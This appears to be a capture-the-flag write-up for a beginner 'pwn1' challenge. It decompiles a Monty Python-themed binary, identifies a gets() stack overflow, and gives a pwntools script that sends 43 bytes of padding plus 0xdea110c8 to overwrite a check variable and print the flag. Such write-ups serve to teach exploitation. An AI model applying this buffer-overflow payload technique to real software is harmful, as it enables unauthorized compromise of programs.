
# pwn1

After passing two string input checks, the buffer is put into the vulnerable `gets()` function, allowing us to clobber the **target** variable and call a function to print out the flag.

```c
undefined4 main(void)

{
  int iVar1;
  char buffer [43];
  int target;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  target = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(buffer,0x2b,_stdin);
  iVar1 = strcmp(buffer,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(buffer,0x2b,_stdin);
  iVar1 = strcmp(buffer,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(buffer); // VULN
  if (target == L'\xdea110c8') {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

`buffer` [-0x43] is **43** bytes away from the `target` [-0x18] variable on the stack.

```
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     00010780(R), 
                                                                                                   000108df(*)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 target                                  XREF[2]:     000107b4(W), 
                                                                                                   000108b2(R)  
             undefined1[43]    Stack[-0x43]   buffer                                  XREF[5]:     000107ed(*), 
                                                                                                   00010803(*), 
                                                                                                   0001084f(*), 
                                                                                                   00010865(*), 
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:000105e6(*), 00010ab8, 
                                                                                          00010b4c(*), 00011ff8(*)  
        00010779 8d 4c 24 04     LEA        ECX=>Stack[0x4],[ESP + 0x4]
```

Send the two necessary strings, then **43** bytes of padding + the (packed) check value `0xdea110c8`.

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./pwn1", checksec=False)
p = process()

payload = b"A"*43 + p32(0xdea110c8)

p.sendline(b"Sir Lancelot of Camelot")
p.sendline(b"To seek the Holy Grail.")
p.sendline(payload)
p.interactive()
```

To get the flag.

```shell
python3 exploit.py

Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}

$
```